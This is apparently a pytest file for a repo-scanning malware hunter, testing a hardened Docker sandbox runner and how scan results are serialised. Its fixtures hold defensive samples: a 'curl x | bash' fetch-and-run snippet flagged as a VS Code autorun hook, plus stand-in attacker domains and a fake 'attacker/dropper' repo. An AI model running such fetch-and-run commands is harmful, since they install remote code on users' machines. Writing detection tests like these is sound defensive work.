"""The sandboxed Tier-2 runner: isolation flags, JSON round-trip, failure modes.

The point of the sandbox is that a downloaded repo's malware never touches the
host. These tests assert the hardened docker flags are present (a missing one is a
hole), that no host path is mounted, and that a container result rebuilds into a
real Tier2Result the hunt can consume. No Docker daemon is required; the runner is
driven with a fake subprocess.
"""

from __future__ import annotations

import json
import subprocess

import pytest

from git_warden.scanning.sandbox_runner import (
    build_run_argv,
    docker_available,
    scan_candidate_sandboxed,
)


def test_run_argv_enforces_every_isolation_flag():
    argv = build_run_argv("owner/repo")
    joined = " ".join(argv)
    # Each of these is a wall; a missing one is a sandbox escape.
    assert "--rm" in argv
    assert "--read-only" in argv
    assert ["--cap-drop", "ALL"] == [argv[i] for i in
                                     (argv.index("--cap-drop"), argv.index("--cap-drop") + 1)]
    assert "no-new-privileges" in joined
    assert "65534:65534" in argv                      # runs as nobody, never root
    assert "--pids-limit" in argv                     # fork-bomb cap
    # hard memory cap: --memory equals --memory-swap (no swap escape)
    mem = argv[argv.index("--memory") + 1]
    assert argv[argv.index("--memory-swap") + 1] == mem
    assert "--cpus" in argv
    assert any(a.startswith("/work:") for a in argv)  # scratch is tmpfs (RAM)


def test_no_host_path_is_mounted():
    # Findings return on stdout, so nothing from the host crosses the boundary.
    argv = build_run_argv("owner/repo")
    assert "-v" not in argv and "--volume" not in argv
    assert "--mount" not in argv


def test_argv_passes_only_the_repo_name_to_the_entrypoint():
    # The image ENTRYPOINT already runs the module; a repeated prefix would make
    # argv[0] the repo (the bug that made every scan reject "python").
    argv = build_run_argv("owner/repo", image="warden-sandbox:latest")
    assert argv[-1] == "owner/repo"
    assert argv[-2] == "warden-sandbox:latest"


def _fake(returncode=0, stdout="", stderr=""):
    def run(argv, capture_output=True, text=True, timeout=None):
        return subprocess.CompletedProcess(argv, returncode, stdout, stderr)
    return run


_GOOD = {
    "full_name": "attacker/dropper", "code_hash": "abc", "commit_sha": "deadbeef1234",
    "bash_score": 8, "confirmed": True, "confidence": "auto",
    "scanners": {"guarddog": "skipped"},
    "bash_findings": [{"file": ".vscode/tasks.json", "line": 0,
                       "category": "install_hook", "rule": "vscode-autorun",
                       "snippet": "curl x | bash"}],
    "confirming_findings": [{"file": ".vscode/tasks.json", "line": 0,
                             "category": "install_hook", "rule": "vscode-autorun",
                             "snippet": "curl x | bash"}],
    "learned_iocs": {"webhooks": [], "telegram": [], "domains": ["evil.tld"]},
    "learned_signatures": ["settings/linux?flag="],
    "package_spread": [],
}


def test_result_rebuilds_into_a_real_tier2result():
    r = scan_candidate_sandboxed("attacker/dropper",
                                 runner=_fake(0, json.dumps(_GOOD)))
    assert r is not None
    assert r.confirmed and r.confidence == "auto" and r.bash_score == 8
    assert r.commit_sha == "deadbeef1234"
    assert [(f.category, f.rule) for f in r.confirming_findings] == \
        [("install_hook", "vscode-autorun")]
    assert "evil.tld" in r.learned_iocs.domains          # IocSet reconstructed
    assert r.learned_signatures == ["settings/linux?flag="]
    assert r.signal_summary()                            # method exists, hunt calls it


def test_result_tolerates_log_noise_before_the_json_line():
    noisy = "cloning...\nwarning: detached HEAD\n" + json.dumps(_GOOD)
    r = scan_candidate_sandboxed("attacker/dropper", runner=_fake(0, noisy))
    assert r is not None and r.confirmed


def test_clone_failed_returns_none():
    payload = json.dumps({"full_name": "gone/repo", "clone_failed": True})
    assert scan_candidate_sandboxed("gone/repo", runner=_fake(0, payload)) is None


@pytest.mark.parametrize("run", [
    _fake(1, "", "boom"),                                # container non-zero exit
    _fake(0, "not json at all"),                         # unparseable
    _fake(0, ""),                                        # empty stdout
])
def test_bad_outcomes_return_none(run):
    assert scan_candidate_sandboxed("x/y", runner=run) is None


def test_timeout_returns_none():
    def run(argv, capture_output=True, text=True, timeout=None):
        raise subprocess.TimeoutExpired(argv, timeout)
    assert scan_candidate_sandboxed("x/y", runner=run) is None


def test_docker_available_true_and_false():
    assert docker_available(  ) in (True, False)         # smoke: never raises


def test_entry_serialization_round_trips():
    # The in-container entry serializes a Tier2Result; the host rebuilds it. This
    # pins the wire contract between the two halves without needing Docker.
    from git_warden.sandbox_entry import _result_to_dict
    from git_warden.scanning.bash_scanner import BashFinding
    from git_warden.scanning.ioc import IocSet
    from git_warden.scanning.sandbox_runner import _result_from_dict
    from git_warden.scanning.tier2 import Tier2Result

    li = IocSet()
    li.domains.update(["c2.example"])
    li.webhooks.update(["123456"])
    f = BashFinding(".vscode/tasks.json", 0, "install_hook", "vscode-autorun", "curl x | bash")
    src = Tier2Result(full_name="a/b", code_hash="h", commit_sha="sha1",
                      bash_findings=[f], bash_score=8, scanners={"yara": "skipped"},
                      confirmed=True, confidence="auto", learned_iocs=li,
                      learned_signatures=["settings/linux?flag="],
                      confirming_findings=[f], package_spread=[])
    rebuilt = _result_from_dict(json.loads(json.dumps(_result_to_dict(src))))
    assert rebuilt.full_name == "a/b"
    assert rebuilt.confirmed and rebuilt.confidence == "auto"
    assert rebuilt.commit_sha == "sha1" and rebuilt.bash_score == 8
    assert [(x.category, x.rule) for x in rebuilt.bash_findings] == \
        [("install_hook", "vscode-autorun")]
    assert "c2.example" in rebuilt.learned_iocs.domains
    assert "123456" in rebuilt.learned_iocs.webhooks
